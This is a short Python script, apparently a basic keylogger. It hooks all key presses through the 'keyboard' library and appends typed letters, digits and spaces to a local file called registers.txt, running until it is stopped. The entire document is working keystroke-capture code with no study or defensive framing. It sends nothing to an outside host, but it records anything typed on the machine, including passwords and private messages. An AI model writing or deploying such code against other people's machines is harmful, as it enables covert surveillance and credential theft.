import keyboard

def on_key_press(key):
    keys_to_ignore=["alt","ctrl","delete","tab","back","esc","enter"]
    
    with open('registers.txt','a') as file:
        if key.name not in keys_to_ignore and key.name.isalnum():
            if key.name == "space":
                file.write(" ")
            else:
                file.write(key.name)
                
keyboard.on_press(on_key_press)
keyboard.wait()